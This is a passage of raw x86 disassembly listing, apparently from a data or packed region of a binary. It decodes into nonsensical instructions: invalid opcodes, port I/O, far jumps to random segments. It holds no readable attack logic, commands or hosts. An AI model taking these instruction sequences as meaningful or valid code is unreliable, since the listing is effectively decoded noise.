  407d1d:	mov    esp,0xca8fef7a
  407d22:	aas    
  407d23:	cmp    BYTE PTR [edi-0x7c],bl
  407d26:	stos   BYTE PTR es:[edi],al
  407d27:	pop    eax
  407d28:	shr    DWORD PTR [edx],1
  407d2a:	jg     0x407d95
  407d2c:	iret   
  407d2d:	xchg   ecx,eax
  407d2e:	pop    esi
  407d2f:	test   eax,0x56f4531
  407d34:	popf   
  407d35:	mov    edx,0xec7e464f
  407d3a:	sahf   
  407d3b:	popa   
  407d3c:	cmp    BYTE PTR [ebx+0x54],dh
  407d3f:	adc    al,0x5b
  407d41:	sbb    esp,DWORD PTR [ebp+0x1b]
  407d44:	or     al,0xb0
  407d46:	ds pop ecx
  407d48:	and    ch,BYTE PTR ds:0x845ca0de
  407d4e:	lahf   
  407d4f:	dec    esp
  407d50:	fadd   QWORD PTR [edx-0x7dc50308]
  407d56:	xlat   BYTE PTR ds:[ebx]
  407d57:	xchg   ecx,eax
  407d58:	pop    esi
  407d59:	into   
  407d5a:	add    eax,0xd90ace3b
  407d5f:	mov    al,ds:0xb826e199
  407d64:	push   esi
  407d65:	gs pop edx
  407d67:	mov    bh,0x54
  407d69:	mov    edi,0x935e4128
  407d6e:	mov    esp,0xa1dbb6cc
  407d73:	mov    eax,ds:0xe66d514b
  407d78:	lahf   
  407d79:	cmp    bh,BYTE PTR [edi+0x51]
  407d7c:	pop    esi
  407d7d:	je     0x407dce
  407d7f:	pusha  
  407d80:	push   es
  407d81:	jae    0x407def
  407d83:	call   0x1ba1de41
  407d88:	and    BYTE PTR [ecx],bl
  407d8a:	xor    eax,0xefea6949
  407d8f:	mov    dh,0x86
  407d91:	test   BYTE PTR [edi],0xc1
  407d94:	scas   al,BYTE PTR es:[edi]
  407d95:	rcl    BYTE PTR [ecx],0xb1
  407d98:	lds    esp,FWORD PTR [eax-0x5d]
  407d9b:	mov    ds:0xe9412f17,eax
  407da0:	pop    ecx
  407da1:	lods   eax,DWORD PTR ds:[esi]
  407da2:	out    dx,al
  407da3:	jl     0x407d77
  407da5:	mov    ecx,0x9b1cccde
  407daa:	(bad)  
  407dab:	mov    al,ds:0x7db75845
  407db0:	mov    bl,0x9d
  407db2:	add    BYTE PTR [esi],0x5e
  407db5:	push   0x3835022
  407dba:	in     al,0x77
  407dbc:	xchg   BYTE PTR [eax+0x3],ah
  407dbf:	ins    BYTE PTR es:[edi],dx
  407dc0:	data16 aam 0xd
  407dc3:	mov    ah,0x51
  407dc5:	cld    
  407dc6:	out    dx,al
  407dc7:	dec    eax
  407dc8:	int3   
  407dc9:	ror    DWORD PTR [ebp+0x212b36a6],0xa9
  407dd0:	aam    0xaa
  407dd2:	fcom   QWORD PTR [esi-0x57d87245]
  407dd8:	add    BYTE PTR [edi+0x70],ch
  407ddb:	aam    0x18
  407ddd:	pop    ss
  407dde:	push   esi
  407ddf:	out    0xcf,eax
  407de1:	(bad)
  407de4:	imul   eax,DWORD PTR [ecx],0x68
  407de7:	sbb    eax,0xa11115d3
  407dec:	(bad)  
  407ded:	xor    BYTE PTR [esi],al
  407def:	imul   ebp,DWORD PTR [edx-0x7e6587b0],0x24ee01ac
  407df9:	pop    ss
  407dfa:	bound  eax,QWORD PTR [ecx+0x5e]
  407dfd:	mov    ah,0xf4
  407dff:	push   ebx
  407e00:	repz loop 0x407df6
  407e03:	neg    DWORD PTR [esi-0x62]
  407e06:	popf   
  407e07:	int    0x80
  407e09:	cwde   
  407e0a:	js     0x407daa
  407e0c:	jl     0x407e6e
  407e0e:	rsqrtps xmm1,xmm3
  407e11:	in     al,0xaa
  407e13:	mov    dl,0x7d
  407e15:	inc    esp
  407e16:	jmp    0x407e71
  407e18:	fistp  QWORD PTR [esi]
  407e1a:	retf   0x5f53
  407e1d:	mov    ebp,ebp
  407e1f:	jns    0x407e01
  407e21:	pusha  
  407e22:	adc    eax,0x130a0943
  407e27:	aad    0xb7
  407e29:	scas   eax,DWORD PTR es:[edi]
  407e2a:	out    dx,al
  407e2b:	or     ebp,DWORD PTR [esi+ebx*4]
  407e2e:	arpl   WORD PTR [eax+0x61114d64],bp
  407e34:	shl    BYTE PTR [eiz*2+0x16491006],0xf8
  407e3c:	int3   
  407e3d:	mov    edx,0x6cdbafee
  407e42:	and    ebx,DWORD PTR [ecx-0x12]
  407e45:	call   0x4d3d2203
  407e4a:	xor    ecx,eax
  407e4c:	mov    BYTE PTR [ecx+0x1f4efa7e],ch
  407e52:	out    0xd6,eax
  407e54:	cmp    DWORD PTR ds:0xfeeebd7f,ebp
  407e5a:	int3   
  407e5b:	arpl   WORD PTR [edx+eax*2+0x4e],si
  407e5f:	stos   BYTE PTR es:[edi],al
  407e60:	ficomp WORD PTR [ecx]
  407e62:	xor    ecx,0x7f9480eb
  407e68:	fwait
  407e69:	test   eax,0x4f349e7
  407e6e:	lock pop ebp
  407e70:	pop    esi
  407e71:	adc    BYTE PTR [ebp+0x66],dl
  407e74:	(bad)  
  407e75:	pop    ecx
  407e76:	push   ds
  407e77:	outs   dx,BYTE PTR ds:[esi]
  407e78:	loope  0x407eb7
  407e7a:	call   0x5e28:0xd05889b1
  407e81:	pop    ebx
  407e82:	sub    al,0x9d
  407e84:	xor    ebp,0xffffffe7
  407e87:	(bad)  
  407e89:	mov    esp,0x1e2ea66a
  407e8e:	mov    ebp,?
  407e90:	imul   esp,eax,0xfffffffc
  407e93:	push   0x51ee85e7
  407e98:	call   0xa8d80123
  407e9d:	mov    ch,al
  407e9f:	mov    al,ds:0xe176e469
  407ea4:	idiv   DWORD PTR [ecx]
  407ea6:	and    DWORD PTR [edx],ebp
  407ea8:	pop    esi
  407ea9:	xchg   ecx,eax
  407eaa:	xlat   BYTE PTR ds:[ebx]
  407eab:	add    BYTE PTR [ecx+esi*2+0x71],dh
  407eaf:	and    ebp,DWORD PTR [ebp+0x60]
  407eb2:	(bad)  
  407eb4:	fdiv   DWORD PTR [edx]
  407eb6:	test   BYTE PTR es:[ecx+0x7a7d4b9a],ch
  407ebd:	pop    edx
  407ebe:	out    dx,al
  407ebf:	outs   dx,BYTE PTR ds:[esi]
  407ec0:	sub    al,bh
  407ec2:	push   es
  407ec3:	data16 (bad) 
  407ec5:	adc    al,0x1d
  407ec7:	mov    al,ds:0x7cba0249
  407ecc:	mov    esi,0x461879ed
  407ed1:	test   al,0xee
  407ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed4:	test   eax,0x875b57dc
  407ed9:	mov    dl,0xdf
  407edb:	out    dx,eax
  407edc:	jnp    0x407f3e
  407ede:	mov    BYTE PTR [edi-0x3b],cl
  407ee1:	fild   DWORD PTR es:[edx+eax*4]
  407ee5:	xchg   ecx,eax
  407ee6:	dec    eax
  407ee7:	push   0x5e
  407ee9:	xor    dh,ah
  407eeb:	sbb    ebp,DWORD PTR [ebp+0x506901fc]
  407ef1:	dec    edx
  407ef2:	mov    esi,0xac60f23a
  407ef7:	or     dl,BYTE PTR [esp+esi*1-0x29a1fe90]
  407efe:	in     eax,0x32
  407f00:	inc    ebp
  407f01:	std    
  407f02:	add    al,0x67
  407f04:	sahf   
  407f05:	pop    ebp
  407f06:	push   eax
  407f07:	jle    0x407eb5
  407f09:	mov    ebx,0xa97642b7
  407f0e:	xor    ah,BYTE PTR [esi+0x1e484b5f]
  407f14:	shr    BYTE PTR [eax-0x51],cl
  407f17:	cmp    BYTE PTR [esi],cl
  407f19:	mov    cl,0xe1
  407f1b:	mov    ds:0x48ade6ab,eax
  407f20:	pop    eax
  407f21:	ss ins DWORD PTR es:[edi],dx
  407f23:	mov    ?,WORD PTR [eax]
  407f25:	test   DWORD PTR [ecx-0x4430a1e1],ebp
  407f2b:	in     al,0xa9
  407f2d:	mov    ebx,0x279201e0
  407f32:	adc    al,0x97
  407f34:	lods   al,BYTE PTR ds:[esi]
  407f35:	mov    al,0xed
  407f37:	mov    al,ds:0x66455481
  407f3c:	repnz pop ecx
  407f3e:	out    dx,al
  407f3f:	inc    ebp
  407f40:	push   ss
  407f41:	adc    eax,0xeec5e633
  407f46:	push   ecx
  407f47:	mov    ds:0x31681ff,al
  407f4c:	and    al,0x65
  407f4e:	push   esi
  407f4f:	popa   
  407f50:	loop   0x407f0d
  407f52:	fs pop ebx
  407f54:	pop    esi
  407f55:	xor    esp,DWORD PTR [ebx]
  407f57:	and    al,0xac
  407f59:	les    edi,FWORD PTR [esi-0x44]
  407f5c:	sbb    eax,0xdc7b8761
  407f61:	mov    al,0x6c
  407f63:	retf   0x839e
  407f66:	call   DWORD PTR [eax+edi*2+0x0]
  407f6a:	leave  
  407f6b:	jnp    0x407fcb
  407f6d:	jmp    0x44ba84c1
  407f72:	mov    al,ds:0x4320d4a4
  407f77:	pop    ecx
  407f78:	pop    ss
  407f79:	pop    ecx
  407f7a:	cs cli 
  407f7c:	mov    ch,0x55
  407f7e:	jmp    0x9e42:0x6e6a717d
  407f85:	repz sub BYTE PTR [edx+0x356f6146],dl
  407f8c:	dec    eax
  407f8d:	jmp    0x407fca
  407f8f:	cmp    BYTE PTR [ecx+eax*4+0x7e8116ff],al
  407f96:	cs ror edx,1
  407f99:	lock lods al,BYTE PTR ds:[esi]
  407f9b:	out    0xe2,al
  407f9d:	pusha  
  407f9e:	fmul   DWORD PTR [edi+0x64c8d636]
  407fa4:	dec    esp
  407fa5:	sbb    dh,ch
  407fa7:	mov    bh,0xa6
  407fa9:	xor    dh,BYTE PTR [edx]
  407fab:	dec    ecx
  407fac:	pop    ss
  407fad:	in     eax,dx
  407fae:	shl    BYTE PTR [ecx+0x629ca6ce],cl
  407fb4:	fisttp QWORD PTR [edi-0x70cca2e2]
  407fba:	out    dx,al
  407fbb:	arpl   WORD PTR [bx+0x6],si
  407fbf:	dec    esp
  407fc0:	sub    bl,BYTE PTR [eax+0x32]
  407fc3:	mov    eax,ds:0xbfae7849
  407fc8:	fst    DWORD PTR [eax+0x3f5d2a2b]
  407fce:	xchg   esi,eax
  407fcf:	mov    ds:0x69ebaa3,eax
  407fd4:	ds xchg ecx,eax
  407fd6:	imul   ebp,DWORD PTR [edi+0x76d48b4],0x26
  407fdd:	js     0x40801c
  407fdf:	pop    esi
  407fe0:	jbe    0x407f6a
  407fe2:	repz in al,dx
  407fe4:	arpl   WORD PTR [ecx+esi*2-0x7d],si
  407fe8:	sub    BYTE PTR [eax+0x15300dd7],ah
  407fee:	cs int 0xcd
  407ff1:	pusha  
  407ff2:	xchg   esi,eax
  407ff3:	data16 sbb al,0x99
  407ff6:	add    dl,BYTE PTR [ebx]
  407ff8:	jl     0x407ff6
  407ffa:	pop    ds
  407ffb:	pop    ebp
  407ffc:	add    ah,cl
  407ffe:	mov    fs,WORD PTR [edx-0x14]
  408001:	cdq    
  408002:	div    BYTE PTR [edi+0x6e]
  408005:	push   ecx
  408006:	xchg   esp,eax
  408007:	and    ebx,edx
  408009:	(bad)  
  40800a:	out    dx,al
  40800b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40800c:	mov    cl,0xf7
  40800e:	pop    ebp
  40800f:	xor    esi,DWORD PTR [edx+edi*1-0x11]
  408013:	(bad)  
  408014:	(bad)  
  408015:	adc    al,0x41
  408017:	and    esi,esi
  408019:	scas   al,BYTE PTR es:[di]
  40801b:	push   ecx
  40801c:	in     al,0x43
  40801e:	shl    eax,1
  408020:	adc    al,0xe5
  408022:	loope  0x407fc4
  408024:	jb     0x408047
  408026:	mov    eax,0x5775e6af
  40802b:	gs pop esi
  40802d:	mov    ecx,0x9ee935d6
  408032:	mov    al,ds:0x6c60c5b3
  408037:	data16 cmp al,0x56
  40803a:	sbb    BYTE PTR [edx],0x63
  40803d:	or     esi,ebp
  40803f:	popf   
  408040:	or     DWORD PTR [edx+0x7755e847],esi
  408046:	out    0x9e,al
  408048:	or     edx,DWORD PTR [edi-0x20]
  40804b:	jecxz  0x40804b
  40804d:	inc    ecx
  40804e:	pop    edx
  40804f:	cmp    eax,0x90ff241c
  408054:	lea    esp,[edi+0x69]
  408057:	mov    fs,esp
  408059:	sub    al,0x6e
  40805b:	mov    dl,0x89
  40805d:	jp     0x4080d8
  40805f:	mov    eax,ds:0xe62f378e
  408064:	test   edx,0x4f5e7fce
  40806a:	hlt    
  40806b:	jp     0x408083
  40806d:	jae    0x40806e
  40806f:	in     al,0x1b
  408071:	ret    0x793e
  408074:	pop    esi
  408075:	add    al,0x36
  408077:	mov    esi,0x72ceb7f2
  40807c:	call   0x8e20:0xae73f444
  408083:	mov    edi,0x9fb9d542
  408088:	pop    esi
  408089:	xlat   BYTE PTR ds:[ebx]
  40808a:	push   esi
  40808b:	jp     0x4080ea
  40808d:	mov    cl,BYTE PTR fs:[edx+0x7cf360c4]
  408094:	push   0xffffffdb
  408096:	xor    DWORD PTR [ecx+0x77],edx
  408099:	add    ebp,esi
  40809b:	das    
  40809c:	mov    al,ds:0xcd1a04be
  4080a1:	ins    BYTE PTR es:[edi],dx
  4080a2:	aad    0xa0
  4080a4:	bound  ebp,QWORD PTR [eax-0xa1985d2]
  4080aa:	fstp   TBYTE PTR [ebx+0x5770485c]
  4080b0:	pop    ebx
  4080b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b2:	call   0xe504:0xb392cca3
  4080b9:	ja     0x408109
  4080bb:	push   ebx
  4080bc:	inc    ecx
  4080bd:	xor    ch,dh
  4080bf:	aaa    
  4080c0:	inc    eax
  4080c1:	push   0xb5e39daa
  4080c6:	inc    ebx
  4080c7:	mov    eax,ds:0xd3612946
  4080cc:	jmp    0x67fb:0x5fc963c3
  4080d3:	retf   0xf757
  4080d6:	mov    bh,BYTE PTR [ecx+0x5a]
  4080d9:	jno    0x4080c4
  4080db:	mov    WORD PTR [ebx-0x751e71eb],ss
  4080e1:	push   cx
  4080e3:	fisub  DWORD PTR [ebx]
  4080e5:	sbb    ebx,ebx
  4080e7:	lahf   
  4080e8:	push   esp
  4080e9:	dec    esp
  4080ea:	leave  
  4080eb:	call   FWORD PTR [esi]
  4080ed:	loope  0x408148
  4080ef:	lea    ecx,[esi+esi*4]
  4080f2:	or     DWORD PTR [ecx-0x4d],esi
  4080f5:	stos   BYTE PTR es:[edi],al
  4080f6:	sub    ah,BYTE PTR [ecx-0x6a4c04a8]
  4080fc:	xor    DWORD PTR [esi+ebp*4-0x8],edx
  408100:	pop    esi
  408101:	outs   dx,DWORD PTR ds:[esi]
  408102:	mov    edx,0xca8c2e8c
  408107:	jnp    0x408170
  408109:	inc    ebp
  40810a:	enter  0x5ca7,0xa1
  40810e:	xlat   BYTE PTR ds:[ebx]
  40810f:	mov    BYTE PTR [ebx+0x466a2c78],bh
  408115:	in     eax,0x6b
  408117:	cmp    ecx,DWORD PTR [edi+0x24]
  40811a:	xchg   esi,eax
  40811b:	cmp    bl,BYTE PTR [esi+0x44]
  40811e:	pop    eax
  40811f:	inc    ecx
  408120:	add    eax,0x7eac49bd
  408125:	sbb    al,0x7c
  408127:	xor    bl,dl
  408129:	pop    ecx
  40812a:	jg     0x40815c
  40812c:	in     eax,0xa0
  40812e:	mul    BYTE PTR [edi+0x25e7e061]
  408134:	push   ds
  408135:	and    ecx,DWORD PTR [esi+0x7a]
  408138:	(bad)  
  408139:	xchg   esp,eax
  40813a:	je     0x4080e9
  40813c:	xor    DWORD PTR [edx+0x24],edx
  40813f:	call   0xa1016566
  408144:	ja     0x4080e7
  408146:	enter  0x4adb,0x26
  40814a:	add    ebx,ecx
  40814c:	sti    
  40814d:	fist   WORD PTR [edx+0x7ff75e71]
  408153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408154:	fbld   TBYTE PTR gs:[ecx+eiz*4+0x5f37b6d4]
  40815c:	add    BYTE PTR [eax+0x765ecbcd],bh
  408162:	cmp    dh,0xc5
  408165:	xor    BYTE PTR ds:0xd84453f6,dh
  40816b:	jae    0x4081a6
  40816d:	mov    eax,ds:0x5ca189c8
  408172:	dec    esi
  408173:	inc    esi
  408174:	pop    ebx
  408175:	idiv   esp
  408177:	(bad)  
  408179:	mov    ds:0x11f743dd,eax
  40817e:	push   edx
  40817f:	mov    gs,esi
  408181:	or     BYTE PTR [eax+0x3b],ah
  408184:	mul    DWORD PTR [eax+0x34]
  408187:	cdq    
  408188:	cli    
  408189:	xchg   edi,eax
  40818a:	dec    eax
  40818b:	retf   0xa8ce
  40818e:	(bad)  
  40818f:	jmp    0x6b0b:0x40ae7ccd
  408196:	cmp    al,BYTE PTR [edi]
  408198:	mov    edi,0x37a2572d
  40819d:	cs dec esp
  40819f:	clc    
  4081a0:	das    
  4081a1:	dec    ebp
  4081a2:	shl    DWORD PTR [edi+eiz*1-0x5f],0xee
  4081a7:	adc    eax,0x73877776
  4081ac:	fidivr WORD PTR [edi+eax*8]
  4081af:	mov    al,ds:0x5771efb6
  4081b4:	dec    esp
  4081b5:	punpckhwd mm7,QWORD PTR [edx]
  4081b8:	pop    ebp
  4081b9:	ins    BYTE PTR es:[edi],dx
  4081ba:	xor    cl,BYTE PTR [ebp-0x1ed54ad4]
  4081c0:	mov    cl,dl
  4081c2:	cmp    esp,DWORD PTR [ecx-0x148ff879]
  4081c8:	mov    ecx,DWORD PTR cs:[ecx+0x3da25e45]
  4081cf:	data16 int 0xa6
  4081d2:	loopne 0x40824e
  4081d4:	scas   eax,DWORD PTR es:[edi]
  4081d5:	pusha  
  4081d6:	xlat   BYTE PTR ds:[ebx]
  4081d7:	jae    0x408227
  4081d9:	iret   
  4081da:	int    0xe
  4081dc:	fistp  WORD PTR [edi]
  4081de:	out    dx,al
  4081df:	iret   
  4081e0:	push   ebp
  4081e1:	out    dx,eax
  4081e2:	add    cl,BYTE PTR ds:0xa322e60e
  4081e8:	pop    ebp
  4081e9:	fwait
  4081ea:	call   0xae9eb93a
  4081ef:	frstor [ecx]
  4081f1:	mov    dl,0xee
  4081f3:	dec    eax
  4081f4:	gs sub dl,ch
  4081f7:	adc    BYTE PTR ds:0x878896b8,dl
  4081fd:	clc    
  4081fe:	mov    WORD PTR [edi-0x346d9f10],?
  408204:	imul   DWORD PTR [ebx+0x29dbc37f]
  40820a:	out    dx,al
  40820b:	cld    
  40820c:	adc    BYTE PTR [edi+0x3c],dl
  40820f:	in     eax,dx
  408210:	lods   eax,DWORD PTR ds:[esi]
  408211:	das    
  408212:	jmp    0x6e5144c2
  408217:	or     DWORD PTR [ecx+0x40e6dff5],ecx
  40821d:	push   ecx
  40821e:	out    dx,al
  40821f:	test   al,0x41
  408221:	pop    ebp
  408222:	cmp    eax,0x323c0bb
  408227:	mov    eax,ds:0xd978a7c2
  40822c:	mov    al,ds:0xf87142ea
  408231:	repz and BYTE PTR [edi-0x1bc9bbb6],dl
  408238:	arpl   WORD PTR [ebp-0x3a4d7eed],cx
  40823e:	xchg   al,ah
  408240:	cmc    
  408241:	inc    esp
  408242:	popa   
  408243:	test   BYTE PTR [edx-0x7d],ch
  408246:	ins    DWORD PTR es:[edi],dx
  408247:	int    0xd3
  408249:	and    BYTE PTR [ecx+0x887d47e],bh
  40824f:	pop    edx
  408250:	pop    esi
  408251:	ds inc eax
  408253:	lods   eax,DWORD PTR ds:[esi]
  408254:	jl     0x408255
  408256:	cmp    DWORD PTR [eax+ecx*8+0x5d082b61],ebx
  40825d:	jns    0x408272
  40825f:	mov    eax,0x658bf242
  408264:	or     al,0x45
  408266:	out    dx,al
  408267:	cwde   
  408268:	mov    eax,ds:0x25b58d38
  40826d:	xchg   ebp,eax
  40826e:	leave  
  40826f:	mov    al,ds:0xaf716b00
  408274:	repnz inc al
  408277:	lea    ebx,[esi+0x65]
  40827a:	pop    ebp
  40827b:	scas   al,BYTE PTR es:[edi]
  40827c:	pop    ss
  40827d:	inc    ebx
  40827e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827f:	ficom  DWORD PTR [ebp+0x5b551514]
  408285:	jne    0x4082a4
  408287:	icebp  
  408288:	xchg   al,dl
  40828a:	push   eax
  40828b:	dec    ecx
  40828c:	stc    
  40828d:	mov    ebx,0x60d5c123
  408292:	(bad)  
  408293:	mov    ah,0x35
  408295:	mov    dh,0xfa
  408297:	loopne 0x408297
  408299:	adc    al,0x6b
  40829b:	dec    esi
  40829c:	pop    esi
  40829d:	hlt    
  40829e:	dec    edx
  40829f:	push   edi
  4082a0:	lahf   
  4082a1:	sbb    dh,BYTE PTR [esi+0x22]
  4082a4:	pop    esi
  4082a5:	cmp    eax,0xa268964c
  4082aa:	sbb    bh,0x8f
  4082ad:	pusha  
  4082ae:	loop   0x408258
  4082b0:	repz sub al,0x24
  4082b3:	je     0x408283
  4082b5:	aam    0xfc
  4082b7:	pop    edi
  4082b8:	int    0xbd
  4082ba:	out    dx,al
  4082bb:	cmp    eax,esi
  4082bd:	pop    ebx
  4082be:	xor    eax,DWORD PTR [esi+0x39]
  4082c1:	popa   
  4082c2:	ror    BYTE PTR [edi],cl
  4082c4:	sub    eax,0xc66c425a
  4082c9:	dec    ebx
  4082ca:	out    dx,al
  4082cb:	sub    BYTE PTR [edx],ch
  4082cd:	aaa    
  4082ce:	ja     0x4082ea
  4082d0:	fwait
  4082d1:	int    0xfd
  4082d3:	mov    esi,0xa193ea10
  4082d8:	push   edi
  4082d9:	inc    ebx
  4082da:	aad    0x62
  4082dc:	pop    es
  4082dd:	xor    edi,esp
  4082df:	push   edi
  4082e0:	ds jns 0x4082c4
  4082e3:	cli    
  4082e4:	out    dx,al
  4082e5:	mov    esp,0x562764cb
  4082ea:	xchg   ecx,eax
  4082eb:	mov    esi,0xd4ee5fde
  4082f0:	inc    eax
  4082f1:	test   al,0x56
  4082f3:	inc    esp
  4082f4:	pop    esi
  4082f5:	or     bh,BYTE PTR [ecx-0x51]
  4082f8:	sub    BYTE PTR [edx-0x20],al
  4082fb:	adc    ecx,esi
  4082fd:	gs adc dl,dl
  408300:	pop    esi
  408301:	punpckldq mm2,DWORD PTR [ecx+0x158c3093]
  408308:	push   ecx
  408309:	mov    bh,0x77
  40830b:	scas   al,BYTE PTR es:[edi]
  40830c:	sbb    edi,DWORD PTR [edx-0x11]
  40830f:	mov    ah,0xeb
  408311:	mov    ah,0x4e
  408313:	sahf   
  408314:	lahf   
  408315:	imul   edx,ecx,0xffffffa3
  408318:	xor    eax,0x4a4cdefb
  40831d:	cmp    eax,0xd86db846
  408322:	out    dx,al
  408323:	cmp    eax,0x68b29211
  408328:	add    BYTE PTR [eax+0x27],0xa1
  40832c:	inc    edi
  40832d:	shr    DWORD PTR [esi],cl
  40832f:	mov    ds:0x63b68344,eax
  408334:	pop    esi
  408335:	pop    ss
  408336:	cdq    
  408337:	and    bh,BYTE PTR [ebx]
  408339:	(bad)  
  40833a:	pop    edi
  40833b:	neg    BYTE PTR [edx+0x61]
  40833e:	sbb    ah,ah
  408340:	jo     0x4083a1
  408342:	push   ecx
  408343:	jmp    0x408395
  408345:	cmp    ecx,DWORD PTR [esi+ecx*8+0x3c]
  408349:	ss push ebx
  40834b:	add    DWORD PTR [esi-0x2a],ebx
  40834e:	sub    cl,BYTE PTR [ecx+ebp*4-0x31524178]
  408355:	(bad)  
  408356:	out    dx,al
  408357:	jg     0x4083c0
  408359:	and    dl,BYTE PTR [ebp-0xf0a0f13]
  40835f:	fld    TBYTE PTR [ecx]
  408361:	dec    ebx
  408362:	loopne 0x4083a4
  408364:	lods   eax,DWORD PTR ds:[esi]
  408365:	gs pop esi
  408367:	mov    ds:0x77d460dc,eax
  40836c:	imul   esp,DWORD PTR [ecx+0x66],0xee2fe75f
  408373:	add    BYTE PTR [ebp+0x1b],cl
  408376:	xchg   DWORD PTR [edi+0x1a],esp
  408379:	xor    DWORD PTR [ebx],0xffffffa4
  40837c:	stc    
  40837d:	aas    
  40837e:	ret    0xeedd
  408381:	sbb    DWORD PTR [esi+0x66],ebx
  408384:	push   ebp
  408385:	mov    esp,0x2a27caee
  40838a:	ins    DWORD PTR es:[edi],dx
  40838b:	xchg   esp,eax
  40838c:	or     DWORD PTR es:[ecx+0x60e7f2a1],esp
  408393:	cli    
  408394:	mov    dh,0xa
  408396:	xchg   esi,eax
  408397:	out    dx,eax
  408398:	push   ecx
  408399:	pop    es
  40839a:	stos   DWORD PTR es:[edi],eax
  40839b:	push   ebx
  40839c:	pop    esi
  40839d:	add    ah,BYTE PTR [edi+0xcec8371]
  4083a3:	mov    eax,ds:0xa9ccf731
  4083a8:	add    ebx,DWORD PTR [edi+0x39]
  4083ab:	mov    al,ds:0x8bafd15e
  4083b0:	out    0x28,al
  4083b2:	sub    al,0x3a
  4083b4:	dec    esp
  4083b5:	popa   
  4083b6:	sub    eax,ebx
  4083b8:	xor    esp,edi
  4083ba:	(bad)
  4083bd:	cdq    
  4083be:	out    dx,al
  4083bf:	jb     0x40839b
  4083c1:	dec    DWORD PTR [edx-0x1929add1]
  4083c7:	mov    al,ds:0x7ce4b6de
  4083cc:	int    0x58
  4083ce:	cli    
  4083cf:	pop    si
  4083d1:	jae    0x40839b
  4083d3:	mov    ebp,0x4933cba3
  4083d8:	jo     0x40843a
  4083da:	xor    al,0xfc
  4083dc:	add    bl,BYTE PTR [edx-0x611b103a]
  4083e2:	and    BYTE PTR [ecx+0x43],bl
  4083e5:	popa   
  4083e6:	shr    DWORD PTR [esi+edx*2-0xb],1
  4083ea:	cld    
  4083eb:	out    dx,al
  4083ec:	aaa    
  4083ed:	popa   
  4083ee:	mov    ebx,0xfacc2fa4
  4083f3:	add    ah,bh
  4083f5:	xchg   ecx,eax
  4083f6:	out    0x44,eax
  4083f8:	mov    ch,BYTE PTR [esi]
  4083fa:	dec    esi
  4083fb:	iret   
  4083fc:	push   ds
  4083fd:	jae    0x40838b
  4083ff:	imul   edi,ebx,0x67d65d56
  408405:	sar    DWORD PTR [ecx-0x5f],cl
  408408:	and    dl,BYTE PTR [ecx-0x34a691c5]
  40840e:	out    dx,al
  40840f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408410:	popf   
  408411:	inc    esp
  408412:	les    edi,FWORD PTR [esi+0x57]
  408415:	aaa    
  408416:	shr    ah,1
  408418:	fbld   TBYTE PTR [eax+0x2a]
  40841b:	cmp    ebp,DWORD PTR [ebx+0x3930697f]
  408421:	retf   
  408422:	out    dx,al
  408423:	mov    edi,?
  408425:	test   ebp,edi
  408427:	fst    QWORD PTR [eax+0x42]
  40842a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40842b:	mov    ds:0x2438b0fa,al
  408430:	cwde   
  408431:	fwait
  408432:	into   
  408433:	mov    cl,0x4
  408435:	xchg   edi,eax
  408436:	add    ecx,esp
  408438:	data16 jae 0x408429
  40843b:	mov    ch,BYTE PTR [ebx-0x45529efe]
  408441:	push   ecx
  408442:	pushf  
  408443:	pop    edi
  408444:	jne    0x4084a9
  408446:	push   cs
  408447:	sbb    DWORD PTR [esi],esp
  408449:	mov    ebx,0x665e42ab
  40844e:	addr16 push cs
  408450:	xchg   esp,eax
  408451:	pop    ds
  408452:	imul   edi,DWORD PTR [esi+0x14],0x60
  408456:	ret    0x237c
  408459:	push   ecx
  40845a:	stos   BYTE PTR es:[edi],al
  40845b:	mov    edi,0x532584b2
  408460:	jp     0x40848d
  408462:	in     eax,dx
  408463:	xchg   ecx,eax
  408464:	cld    
  408465:	out    dx,al
  408466:	jb     0x4084d6
  408468:	mov    eax,ds:0xb49b2a02
  40846d:	pusha  
  40846e:	inc    eax
  40846f:	jb     0x408411
  408471:	call   0xa7ee:0xc4b175d3
  408478:	jl     0x40847a
  40847a:	xor    al,0x8e
  40847c:	cs push cs
  40847e:	or     al,0x31
  408480:	xlat   BYTE PTR ds:[ebx]
  408481:	pusha  
  408482:	lock or BYTE PTR [ebp+0x6b],dl
  408486:	mov    bh,0x6a
  408488:	jne    0x4084f2
  40848a:	out    0x67,eax
  40848c:	and    esi,DWORD PTR [ebx-0x5af1412b]
  408492:	pop    ecx
  408493:	pop    ebx
  408494:	jge    0x4084f6
  408496:	arpl   WORD PTR [eax+0x43e4bf2b],dx
  40849c:	sbb    al,0x62
  40849e:	and    ch,dl
  4084a0:	cmp    ah,BYTE PTR [ecx-0x47]
  4084a3:	shr    BYTE PTR [esi+0x7fc37d14],0x60
  4084aa:	cmp    eax,0xc03491c9
  4084af:	xor    eax,0x70ee72e4
  4084b4:	mov    eax,0x2a72b806
  4084b9:	jbe    0x408484
  4084bb:	fwait
  4084bc:	icebp  
  4084bd:	jno    0x4084fa
  4084bf:	and    al,0xde
  4084c1:	pop    ebp
  4084c2:	add    BYTE PTR [edi],bh
  4084c4:	call   0xa45f72e2
  4084c9:	push   edx
  4084ca:	push   edi
  4084cb:	cmp    eax,0xa40fc3a2
  4084d0:	fsubr  QWORD PTR [ebp-0x58c646d2]
  4084d6:	xchg   BYTE PTR [ebp-0x1e115d44],al
  4084dc:	adc    ah,BYTE PTR [ebx]
  4084de:	jmp    0x67ddef01
  4084e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e4:	mov    ebp,0x2f6cfcc0
  4084e9:	or     DWORD PTR [esi+0x68],0x39
  4084ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ee:	add    eax,edx
  4084f0:	stc    
  4084f1:	and    al,0x20
  4084f3:	and    DWORD PTR [eax],eax
  4084f5:	fcmovb st,st(7)
  4084f7:	lahf   
  4084f8:	popa   
  4084f9:	dec    DWORD PTR ds:0xe23caa1
  4084ff:	and    ebx,DWORD PTR [esi*8+0x465eae24]
  408506:	jns    0x408507
  408508:	adc    ebx,DWORD PTR [edi+0x51691b6a]
  40850e:	mov    ds:0xe97ee387,al
  408513:	bnd je 0x4084f6
  408516:	mov    dl,0x88
  408518:	fsubr  DWORD PTR [edi-0x12]
